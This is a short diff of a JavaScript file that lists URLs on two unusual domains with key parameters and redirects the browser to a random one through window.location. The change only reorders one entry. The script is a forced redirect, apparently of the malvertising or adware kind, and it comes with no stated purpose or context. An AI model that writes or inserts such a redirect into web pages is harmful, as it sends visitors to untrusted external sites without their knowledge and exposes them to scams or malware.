@@ -1,6 +1,5 @@
 var dataUrl = [
 '//anomalousporch.com/bcf9j7den?key=6f0346ec565f3485f607d1f027ca2032',
-'//anomalousporch.com/z84tdeyj5?key=cf9108918b929c0e8e6585863921bc00',
 '//wavermerchandiseweird.com/a8bdifyf?key=48e6c2ef69984c23a22ba95e4592b445',
 '//wavermerchandiseweird.com/imzgcwsh?key=d0d188da2017ef9ee01fb562798d386a',
 '//wavermerchandiseweird.com/h9wh6gqgf?key=83df023c116b0886f39e57dbd5e916f1',
@@ -16,7 +15,8 @@ var dataUrl = [
 '//wavermerchandiseweird.com/n970yii7c?key=434c6176282b18468a76f961e6a21764',
 '//wavermerchandiseweird.com/y425t3d5k?key=b0d195ca768aeab7d18aad598d71b0b0',
 '//wavermerchandiseweird.com/nuudznpz3?key=3d998b3da5397f5ac865ff0734c2be19',
-'//wavermerchandiseweird.com/uqf9166i4v?key=6863b7b7d27f7caf1b440a90c37c2ffb'
+'//wavermerchandiseweird.com/uqf9166i4v?key=6863b7b7d27f7caf1b440a90c37c2ffb',
+'//anomalousporch.com/z84tdeyj5?key=cf9108918b929c0e8e6585863921bc00'
 ];
 var randomItem = dataUrl[Math.floor(Math.random()*dataUrl.length)];
 window.location = randomItem;
